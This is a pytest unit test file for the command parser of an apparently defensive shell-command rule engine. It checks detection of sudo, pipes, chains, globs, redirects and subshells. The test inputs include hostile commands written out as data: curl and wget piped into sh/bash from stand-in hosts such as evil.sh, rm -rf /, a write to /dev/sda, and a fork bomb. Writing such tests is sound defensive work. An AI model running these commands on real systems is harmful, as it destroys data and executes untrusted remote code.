"""
Unit tests for the Command Parser — Owner: Harshit
Tests cover every structural case the rule engine will encounter.
"""

import pytest
from engine.parser.command_parser import CommandParser, ParsedCommand


@pytest.fixture
def parser():
    return CommandParser()


# ─────────────────────────────────────────────────────────────────────────────
class TestBasicParsing:

    def test_simple_command(self, parser):
        p = parser.parse("ls -la /home", cwd="/", user="user")
        assert p.base_command == "ls"
        assert "-la" in p.flags
        assert "/home" in p.arguments

    def test_empty_command(self, parser):
        p = parser.parse("", cwd="/", user="user")
        assert p.base_command == ""
        assert p.tokens == []

    def test_whitespace_only(self, parser):
        p = parser.parse("   ", cwd="/", user="user")
        assert p.base_command == ""

    def test_command_with_double_quotes(self, parser):
        p = parser.parse('echo "hello world"', cwd="/", user="user")
        assert p.base_command == "echo"
        assert "hello world" in p.arguments

    def test_multiple_flags_combined(self, parser):
        p = parser.parse("rm -rf /tmp/test", cwd="/", user="user")
        assert p.base_command == "rm"
        assert "-rf" in p.flags
        assert "/tmp/test" in p.arguments


# ─────────────────────────────────────────────────────────────────────────────
class TestSudoDetection:

    def test_sudo_basic(self, parser):
        p = parser.parse("sudo rm -rf /tmp/test", cwd="/", user="user")
        assert p.is_sudo is True
        assert p.base_command == "rm"
        assert "-rf" in p.flags

    def test_sudo_with_user_flag(self, parser):
        p = parser.parse("sudo -u root chmod 777 /etc", cwd="/", user="user")
        assert p.is_sudo is True
        assert p.base_command == "chmod"

    def test_sudo_with_env_preserve(self, parser):
        p = parser.parse("sudo -E rm /tmp/test", cwd="/", user="user")
        assert p.is_sudo is True
        assert p.base_command == "rm"

    def test_doas(self, parser):
        p = parser.parse("doas rm -rf /var/log/syslog", cwd="/", user="user")
        assert p.is_sudo is True
        assert p.base_command == "rm"

    def test_no_sudo(self, parser):
        p = parser.parse("rm -rf /tmp/test", cwd="/", user="user")
        assert p.is_sudo is False


# ─────────────────────────────────────────────────────────────────────────────
class TestPipeParsing:

    def test_simple_pipe(self, parser):
        p = parser.parse("curl http://x.sh | sh", cwd="/", user="user")
        assert p.has_pipe is True
        assert len(p.pipe_segments) == 2
        assert p.pipe_segments[0].base_command == "curl"
        assert p.pipe_segments[1].base_command == "sh"

    def test_no_split_on_logical_or(self, parser):
        p = parser.parse("ls /foo || echo 'not found'", cwd="/", user="user")
        assert p.has_pipe is False
        assert p.base_command == "ls"

    def test_triple_pipe(self, parser):
        p = parser.parse("cat /etc/passwd | grep root | cut -d: -f1", cwd="/", user="user")
        assert p.has_pipe is True
        assert len(p.pipe_segments) == 3
        assert p.pipe_segments[2].base_command == "cut"

    def test_pipe_inside_quotes_not_split(self, parser):
        p = parser.parse("echo '| not a pipe |'", cwd="/", user="user")
        assert p.has_pipe is False

    def test_wget_pipe_bash(self, parser):
        p = parser.parse("wget -qO- http://evil.sh | bash", cwd="/", user="user")
        assert p.has_pipe is True
        assert p.pipe_segments[-1].base_command == "bash"


# ─────────────────────────────────────────────────────────────────────────────
class TestChainParsing:

    def test_semicolon_chain(self, parser):
        p = parser.parse("cd /; rm -rf *", cwd="/home", user="user")
        assert len(p.chain_segments) == 2
        assert p.chain_segments[0].base_command == "cd"
        assert p.chain_segments[1].base_command == "rm"
        assert p.chain_segments[1].chain_operator == ";"

    def test_and_chain(self, parser):
        p = parser.parse("ls /boot && rm -rf /boot", cwd="/", user="user")
        assert len(p.chain_segments) == 2
        assert p.chain_segments[1].base_command == "rm"
        assert p.chain_segments[1].chain_operator == "&&"

    def test_or_chain(self, parser):
        p = parser.parse("ls /foo || echo missing", cwd="/", user="user")
        assert len(p.chain_segments) == 2
        assert p.chain_segments[1].base_command == "echo"
        assert p.chain_segments[1].chain_operator == "||"

    def test_triple_chain(self, parser):
        p = parser.parse("echo start; rm -rf /tmp/x; echo done", cwd="/", user="user")
        assert len(p.chain_segments) == 3

    def test_no_chain_single_command(self, parser):
        p = parser.parse("rm -rf /tmp/test", cwd="/", user="user")
        # Single command — chain_segments has just itself or is empty (no split)
        assert p.base_command == "rm"


# ─────────────────────────────────────────────────────────────────────────────
class TestGlobDetection:

    def test_glob_star(self, parser):
        p = parser.parse("rm -rf /var/log/*", cwd="/", user="user")
        assert p.is_glob is True
        assert "/var/log/*" in p.glob_patterns

    def test_glob_question_mark(self, parser):
        p = parser.parse("ls /tmp/file?.txt", cwd="/", user="user")
        assert p.is_glob is True

    def test_no_glob(self, parser):
        p = parser.parse("rm -rf /var/log/syslog", cwd="/", user="user")
        assert p.is_glob is False


# ─────────────────────────────────────────────────────────────────────────────
class TestRedirectDetection:

    def test_output_redirect(self, parser):
        p = parser.parse("echo '' > /dev/sda", cwd="/", user="user")
        assert p.has_redirect is True

    def test_append_redirect(self, parser):
        p = parser.parse("echo 'line' >> /etc/hosts", cwd="/", user="user")
        assert p.has_redirect is True

    def test_input_redirect(self, parser):
        p = parser.parse("wc -l < /etc/passwd", cwd="/", user="user")
        assert p.has_redirect is True

    def test_no_redirect(self, parser):
        p = parser.parse("ls -la /home", cwd="/", user="user")
        assert p.has_redirect is False


# ─────────────────────────────────────────────────────────────────────────────
class TestSubshellDetection:

    def test_subshell_dollar(self, parser):
        p = parser.parse("rm -rf $(cat /tmp/targets.txt)", cwd="/", user="user")
        assert p.has_subshell is True

    def test_backtick_subshell(self, parser):
        p = parser.parse("chmod 777 `cat paths.txt`", cwd="/", user="user")
        assert p.has_subshell is True

    def test_no_subshell(self, parser):
        p = parser.parse("rm -rf /tmp/test", cwd="/", user="user")
        assert p.has_subshell is False


# ─────────────────────────────────────────────────────────────────────────────
class TestDryRunDetection:

    def test_dry_run_long_flag(self, parser):
        p = parser.parse("rm --dry-run /var/log/*", cwd="/", user="user")
        assert p.is_dry_run is True

    def test_dry_run_short_flag(self, parser):
        # rsync -n is dry-run equivalent
        p = parser.parse("rsync -n /src /dst", cwd="/", user="user")
        assert p.is_dry_run is True

    def test_no_dry_run(self, parser):
        p = parser.parse("rm -rf /var/log/*", cwd="/", user="user")
        assert p.is_dry_run is False


# ─────────────────────────────────────────────────────────────────────────────
class TestEdgeCases:

    def test_fork_bomb_survives_parse(self, parser):
        """Fork bomb must not crash the parser — safety analysis happens elsewhere."""
        cmd = ":(){ :|:& };:"
        p = parser.parse(cmd, cwd="/", user="user")
        assert p.raw == cmd  # Survived, raw preserved

    def test_very_long_command(self, parser):
        cmd = "echo " + "a" * 5000
        p = parser.parse(cmd, cwd="/", user="user")
        assert p.base_command == "echo"

    def test_unclosed_quote_fallback(self, parser):
        """Unclosed quote should fall back to whitespace split, not crash."""
        cmd = "rm -rf '/tmp/bad"
        p = parser.parse(cmd, cwd="/", user="user")
        assert p.base_command == "rm"

    def test_cwd_and_user_preserved(self, parser):
        p = parser.parse("ls", cwd="/home/harshit", user="harshit")
        assert p.cwd == "/home/harshit"
        assert p.user == "harshit"

    def test_nested_sudo_bash(self, parser):
        """sudo bash -c 'cmd' — base_command should be bash."""
        p = parser.parse("sudo bash -c 'rm -rf /'", cwd="/", user="user")
        assert p.is_sudo is True
        assert p.base_command == "bash"
